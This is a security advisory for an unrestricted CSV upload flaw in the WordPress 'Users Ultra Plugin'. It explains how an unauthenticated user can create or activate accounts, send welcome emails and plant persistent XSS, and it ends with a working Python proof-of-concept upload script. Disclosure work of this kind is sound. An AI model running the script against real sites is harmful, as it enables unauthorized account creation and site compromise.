Description
================================================================================

WordPress plugin `Users Ultra Plugin` suffers for an unrestricted file upload vulnerability.

Any user (registered or not) can exploit a misbehavior of the plugin in order to upload csv files to the infected website. Although the plugin checks file extension using an extensions white-list (in this case only csv files are white-listed), no other checks (mime, size etc) are taking place. This alone can expose the infected website to a variety of attacks, please see [OWASP Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload) to get an idea.

Details
================================================================================

The plugin workflow that could allow a malicious user to exploit this misbehavior is as follows:

1. Upon initialization of the plugin (anytime if it is activated) an instance of `XooUserUser` class is created
2. In the constructor of `XooUserUser` class a check for POST variable `uultra-form-cvs-form-conf` is taking place
    file `wp-content/plugins/users-ultra/xooclasses/xoo.userultra.user.php` lines 19-23
    ```php
    if (isset($_POST[&#039;uultra-form-cvs-form-conf&#039;])) 
    {
      /* Let&#039;s Update the Profile */
      $this->process_cvs($_FILES);        
    }
    ```
3. Assuming the POST variable `uultra-form-cvs-form-conf` has been set in the request, the method `XooUserUser::process_cvs()` is called.
4. `XooUserUser::process_cvs()` method process every file in $_FILES super-global by only making a check if the file has a `csv` extension

In addition we mark the following points:

1. A malicious user can create and activate user accounts by exploiting this vulnerability if `$_POST["uultra-activate-account"]` is set to `active`
2. A welcome email is send if `$_POST["uultra-send-welcome-email"]` is set to 1
3. The csv files uploaded to the server are stored in a directory (`wp-content/usersultramedia/import` by default) accessible by anyone
5. No sanitization for values in csv file can easily lead to a Persistent XSS attack, so an attacker can compromise the whole site

PoC
================================================================================

The following Python3 script forms a csv file and uploads it to a site

```python3
#!/usr/bin/python3
import requests
import csv
import tempfile

url = &#039;http://example.com/&#039;

postData = {
    &#039;uultra-form-cvs-form-conf&#039;: 1,
    &#039;uultra-send-welcome-email&#039;: 1,
    &#039;uultra-activate-account&#039;: &#039;pending&#039;
}

csvFileHeader = [&#039;user name&#039;, &#039;email&#039;, &#039;display name&#039;, &#039;registration date&#039;, &#039;first name&#039;, &#039;last name&#039;, &#039;age&#039;, &#039;country&#039;]
csvFileRow = [&#039;userName&#039;, &#039;email@example.com&#039;, &#039;User Name&#039;, &#039;1/1/1&#039;, &#039;User&#039;, &#039;Name&#039;, &#039;100&#039;, &#039;IO&#039;]

csvFile = tempfile.NamedTemporaryFile(mode=&#039;a+t&#039;, suffix=&#039;.csv&#039;)

wr = csv.writer(csvFile, quoting=csv.QUOTE_ALL, delimiter=&#039;,&#039;)

wr.writerow(csvFileHeader)
wr.writerow(csvFileRow)

csvFile.seek(0)

files = {&#039;file.csv&#039;: csvFile}

r = requests.post(url, data=postData, files=files)

exit(0)
```
